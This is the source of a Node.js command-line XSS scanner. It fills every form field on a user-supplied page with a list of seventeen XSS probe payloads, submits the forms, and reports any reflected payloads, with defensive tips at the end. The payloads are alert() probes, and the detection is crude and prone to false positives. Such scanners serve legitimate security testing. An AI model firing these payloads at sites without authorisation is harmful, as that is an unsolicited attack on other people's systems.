const axios = require('axios');
const cheerio = require('cheerio');
const chalk = require('chalk');
const cliProgress = require('cli-progress');

class XSSScanner {
    constructor() {
        this.payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '\'"><script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '<body onload=alert("XSS")>',
            '<iframe src="javascript:alert(`XSS`)">',
            '<input onfocus=alert("XSS") autofocus>',
            '<details open ontoggle=alert("XSS")>',
            '<select onfocus=alert("XSS")></select>',
            '<video><source onerror=alert("XSS")>',
            '<audio src=x onerror=alert("XSS")>',
            '<form><button formaction=javascript:alert("XSS")>',
            '<math href="javascript:alert("XSS")">CLICK',
            '"><img src=x onerror=alert("XSS")>',
            '\'onfocus=alert("XSS") autofocus=\'',
            '"><script>alert(String.fromCharCode(88,83,83))</script>'
        ];
        
        this.vulnerabilities = [];
    }

    async scanWebsite(url) {
        console.log(chalk.blue(`\n Starting XSS scan for: ${url}\n`));
        
        try {
            const response = await axios.get(url, {
                timeout: 10000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            });

            const $ = cheerio.load(response.data);
            const forms = $('form');
            console.log(chalk.yellow(`Found ${forms.length} form on page`));
            const inputs = $('input, textarea, select');
            console.log(chalk.yellow(`Found ${inputs.length} input field\n`));
            const progressBar = new cliProgress.SingleBar({
                format: 'Progress |' + chalk.cyan('{bar}') + '| {percentage}% | {value}/{total} Payloads',
                barCompleteChar: '\u2588',
                barIncompleteChar: '\u2591',
                hideCursor: true
            });

            progressBar.start(this.payloads.length, 0);
            for (let i = 0; i < this.payloads.length; i++) {
                const payload = this.payloads[i];
                try {
                    await this.testPayload(url, payload, $);
                    progressBar.update(i + 1);
                    await new Promise(resolve => setTimeout(resolve, 500));
                } catch (error) {
                    console.log(chalk.red(`\nError: ${payload}`));
                }
            }

            progressBar.stop();
            this.displayResults();

        } catch (error) {
            console.log(chalk.red(`\nError: ${error.message}`));
        }
    }

    async testPayload(baseUrl, payload, $) {
        const forms = $('form');
        for (let i = 0; i < forms.length; i++) {
            const form = $(forms[i]);
            const formAction = form.attr('action');
            const formMethod = (form.attr('method') || 'get').toLowerCase();
            const targetUrl = formAction ? new URL(formAction, baseUrl).href : baseUrl;
            const inputs = form.find('input, textarea, select');
            const formData = {};
            inputs.each((index, element) => {
                const input = $(element);
                const name = input.attr('name');
                if (name) {
                    // Use payload for all fields or specific types
                    const inputType = input.attr('type');
                    if (inputType !== 'submit' && inputType !== 'button') {
                        formData[name] = payload;
                    } else {
                        formData[name] = input.attr('value') || '';
                    }
                }
            });

            try {
                let response;
                if (formMethod === 'post') {
                    response = await axios.post(targetUrl, formData, {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        },
                        timeout: 10000,
                        validateStatus: null
                    });
                } else {
                    const params = new URLSearchParams(formData);
                    response = await axios.get(`${targetUrl}?${params}`, {
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        },
                        timeout: 10000,
                        validateStatus: null
                    });
                }

                if (response.data.includes(payload.replace(/<script>|<\/script>/g, ''))) {
                    this.vulnerabilities.push({
                        url: targetUrl,
                        payload: payload,
                        method: formMethod.toUpperCase(),
                        formIndex: i + 1,
                        reflection: true
                    });
                }

                if (this.detectXSSPattern(response.data, payload)) {
                    this.vulnerabilities.push({
                        url: targetUrl,
                        payload: payload,
                        method: formMethod.toUpperCase(),
                        formIndex: i + 1,
                        pattern: true
                    });
                }

            } catch (error) {
                continue;
            }
        }
    }

    detectXSSPattern(html, payload) {
        const patterns = [
            /<script>/i,
            /onerror=/i,
            /onload=/i,
            /onfocus=/i,
            /javascript:/i,
            /<img[^>]*src=x/i,
            /<svg[^>]*onload/i
        ];

        return patterns.some(pattern => pattern.test(html));
    }

    displayResults() {
        console.log(chalk.green('\n' + '='.repeat(80)));
        console.log(chalk.green.bold('XSS VULNERABILITY SCAN RESULTS'));
        console.log(chalk.green('='.repeat(80)));

        if (this.vulnerabilities.length === 0) {
            console.log(chalk.green('No XSS vulnerabilities were detected'));
            return;
        }

        console.log(chalk.red.bold(`\n Found ${this.vulnerabilities.length} potential XSS vulnerability:\n`));
        this.vulnerabilities.forEach((vuln, index) => {
            console.log(chalk.yellow(` Vulnerability #${index + 1}:`));
            console.log(chalk.white(`   URL: ${vuln.url}`));
            console.log(chalk.white(`   Method: ${vuln.method}`));
            console.log(chalk.white(`   Form: #${vuln.formIndex}`));
            console.log(chalk.red(`   Payload: ${vuln.payload}`));
            
            if (vuln.reflection) {
                console.log(chalk.red('PAYLOAD TER-REFLECT DI RESPONSE'));
            }
            if (vuln.pattern) {
                console.log(chalk.red(' POLA XSS TERDETEKSI DI RESPONSE'));
            }
            
            console.log(chalk.gray('   '.repeat(40)));
        });

        console.log(chalk.blue('\nTips:'));
        console.log(chalk.blue('   - Validate and sanitize all user input'));
        console.log(chalk.blue('   - Use Content Security Policy (CSP)'));
        console.log(chalk.blue('   - Encode output before displaying to userr'));
        console.log(chalk.blue('   - Use a trusted library sanitization\n'));
    }
}

async function main() {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    console.log(chalk.cyan(`
    ╔═══════════════════════════════════════════════╗
    ║             XSS VULNERABILITY SCANNER         ║
    ║              Created for Security Testing     ║
    ╚═══════════════════════════════════════════════╝
    `));

    console.log("Enter the URL of the website to be scanned:");
    readline.question('-> ', async (url) => {
        readline.close();
        if (!url.startsWith('http://') && !url.startsWith('https://')) {
            url = 'http://' + url;
        }

        const scanner = new XSSScanner();
        await scanner.scanWebsite(url);
    });
}

    main().catch(console.error);
